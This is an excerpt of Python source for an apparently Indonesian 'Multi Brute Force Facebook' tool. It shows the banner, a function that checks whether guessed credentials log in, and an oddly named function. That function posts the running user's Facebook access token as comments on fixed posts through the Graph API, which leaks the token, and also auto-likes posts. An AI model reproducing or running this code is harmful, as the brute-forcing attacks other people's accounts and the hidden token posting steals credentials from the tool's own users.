...
#### BUAT BANNER
def banner():
    l1 = (' %s _____ __________     _____      _____    _______    ________ %s'%(K,H))
    l2 = ('%s/     \\______   \   /  _  \    /  _  \   \      \  /  _____/ %s'%(H,K))
    l3 = ('%s/  \ /  \|       _/  /  /_\  \  /  /_\  \  /   |   \/   \  ___ %s'%(K,H))
    l4 = ('%s/    Y    \    |   \ /    |    \/    |    \/    |    \    \_\  \%s'%(H,K))
    l5 = ('%s        \/       \/          \/         \/         \/        \/ %s'%(K,H))
    l6 = ('%s Multi Brute Force Facebook %s%s %sBy %Aang Satria     '%(H,K,Version,H,K))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
...
def ___fii___Sayang___Kamu___Widiya___():
    ...
    requests.post('https://graph.facebook.com/124531676914056/comments/?message=' + pipp + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/124531676914056/comments/?message=' + komentar + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/124531676914056/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/122682133765677/comments/?message=' + token + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/122682133765677/comments/?message=' + kon + '&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/122682133765677/likes?summary=true&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/122173987149825/likes?summary=true&access_token=' + (token),cookies=cookie)
    requests.post('https://graph.facebook.com/122173987149825/likes?summary=true&access_token=' + (token),cookies=cookie)
    menu()
...
def log_hasil(user, pasw):
    ...
    if "c_user" in ses.cookies:
      jalan(f"{P}[•]{I} Akun berhasil di login")
        ...
        jalan(f"{P}[•]{M} Akun tersebut sandi nya telah di ganti")
